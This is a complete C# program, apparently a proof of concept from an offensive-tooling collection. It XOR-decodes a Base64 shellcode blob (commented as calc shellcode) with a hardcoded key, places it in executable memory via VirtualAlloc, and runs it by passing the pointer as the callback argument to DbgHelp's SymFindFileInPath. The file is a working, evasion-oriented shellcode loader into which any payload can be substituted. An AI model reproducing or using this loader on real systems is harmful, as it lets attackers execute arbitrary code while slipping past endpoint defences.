using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;

namespace AltCallbacks
{
    class Callback
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SYMSRV_INDEX_INFO
        {
            // Member variables
            public uint sizeofstruct;
            public string file;
            public bool stripped;
            public uint timestamp;
            public uint size;
            public string dbgfile;
            public string pdbfile;
            public Guid guid;
            public uint sig;
            public uint age;
        }

        const uint MEM_COMMIT = 0x00001000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernelbase.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("DbgHelp.dll")]
        public static extern bool SymInitialize(IntPtr hProcess, string UserSearchPath, bool fInvadeProcess);

        [DllImport("DbgHelp.dll")]
        public static extern bool SymSrvGetFileIndexInfo(string File, ref SYMSRV_INDEX_INFO Info, uint Flags);

        [DllImport("DbgHelp.dll")]
        static extern bool SymFindFileInPath(IntPtr hProcess, String searchPath, String filename, uint id, uint two, uint three, uint flags, StringBuilder filePath, IntPtr callback, IntPtr context);

        
        static string key = "THISISMYKEY";

        static void Main(string[] args)
        {
            // Calc shellcode
            string base64 = @"qADKt7m7jVlLRRgFCRkBGAUFaJkgEd8aKRvCAVURwBd5HMM7AwFc+hMBCGidAHiT5W8sJUlpeRWJgF4IUoy7phcYBQDCAWnYD2UDRInfyMFTSVMF3IsxPhxJmQPCG1UdwAV5HUmZsB8bspAKzm3cAEiFBGKEEXqF9RWJgF4IUoxhqzCoGEsFd0EWdIg+nQEQwwl3AFKdPwrOVRwMwhNVGkyJCs5d3ABIgwgLDAEVHAMVEAgKCAkF2qdlGAa3qQsIChcRwFewA7e2rBQb91hLRVlUSElTAd7AWEpFWRXyeNgm1LKM8KVEfkII6e/G8MS0kBHXjGFvTy9H2bClLFHzDkA7PCdZEgTQjrecMCg/LncuPTxU";

            byte[] decoded = Convert.FromBase64String(base64);
            byte[] shellcode = new byte[decoded.Length];

            for (int i = 0; i < decoded.Length; i++)
                shellcode[i] = ((byte)(decoded[i] ^ key[(i % key.Length)]));

            IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
            Marshal.Copy(shellcode, 0, p, shellcode.Length);

            IntPtr process = System.Diagnostics.Process.GetCurrentProcess().Handle;

            SymInitialize(process, String.Empty, true);

            SYMSRV_INDEX_INFO fInfo = new SYMSRV_INDEX_INFO();

            SymSrvGetFileIndexInfo("c:\\windows\\system32\\kernel32.dll", ref fInfo, 0);
            StringBuilder dummy = new StringBuilder(261);
            
            // Callback function
            SymFindFileInPath(process, "C:\\windows\\system32", "kernel32.dll",
                fInfo.timestamp, fInfo.size, 0, 0x04, dummy, p, IntPtr.Zero);

            return;
        }
    }
}
